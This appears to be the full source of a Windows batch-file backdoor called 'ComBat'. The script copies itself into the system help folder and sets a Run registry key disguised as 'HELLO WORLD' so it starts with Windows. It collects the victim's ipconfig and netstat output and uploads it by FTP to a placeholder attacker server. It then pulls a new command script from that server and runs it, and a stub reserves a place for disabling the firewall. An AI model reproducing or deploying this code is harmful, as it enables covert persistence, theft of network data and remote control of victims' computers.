@ECHO OFF
:ComBat
DEL /F /Q "%SystemRoot%\help\combat\com.bat"
IF EXIST "%SystemRoot%\help\combat\server.bat" GOTO LOG
MKDIR "%SystemRoot%\help\combat\"
> "%SystemRoot%\help\combat\com.bat" ECHO @ECHO OFF
>>"%SystemRoot%\help\combat\com.bat" ECHO MOVE /Y %0 "%SystemRoot%\help\combat\"
>>"%SystemRoot%\help\combat\com.bat" ECHO CALL "%SystemRoot%\help\combat\server.bat"
GOTO RUN

:LOG
DEL /F /Q "%SystemRoot%\help\combat\%USERNAME%.log"
> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO Server Log:
>> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO.

:PATH
PATH|FIND "WINDOWS" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINDOWS
PATH|FIND "SYSTEM" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM
PATH|FIND "WINNT" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINNT
PATH|FIND "SYSTEM32" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM32

:FINDOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO WinXP
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO WinNT
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO END

:WinXP
> "%SystemRoot%\help\combat\regpatch.reg" ECHO Windows Registry Editor Version 5.00
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO FINDOS
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /Q "%SystemRoot%\help\combat\regpatch.reg"

:ComXP
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO get "comXP.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO ComXP
GOTO KillFW

:Win2K
> "%SystemRoot%\help\combat\regpatch.reg" ECHO Windows Registry Editor Version 5.00
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO FINDOS
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /Q "%SystemRoot%\help\combat\regpatch.reg"

:Com2K
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO get "com2K.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO Com2K
GOTO KillFW

:WinNT
> "%SystemRoot%\help\combat\regpatch.reg" ECHO REGEDIT4
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO FINDOS
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /Q "%SystemRoot%\help\combat\regpatch.reg"

:ComNT
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO get "comNT.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO ComNT
GOTO KillFW

:Win9X
> "%SystemRoot%\help\combat\regpatch.reg" ECHO REGEDIT4
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO FINDOS
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /Q "%SystemRoot%\help\combat\regpatch.reg"

:Com9X
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO get "com9x.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO Com9X
GOTO KillFW

:KillFW
REM add Firewall killing NET STOP commands here.

:PING
PING (ftp server) -n 4 -w 1000 >NUL
IF ERRORLEVEL 1 GOTO PING

:STATS
IF NOT EXIST "%SystemRoot%\help\combat\%USERNAME%.log" GOTO LOG
IPCONFIG /all >> "%SystemRoot%\help\combat\%USERNAME%.log"
NETSTAT -a -n >> "%SystemRoot%\help\combat\%USERNAME%.log"

:FTP
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO PATH
FTP -s:"%SystemRoot%\help\combat\com.txt"
DEL /F /Q "%SystemRoot%\help\combat\com.txt"

:RUN
CALL "%SystemRoot%\help\combat\com.bat"

:END
EXIT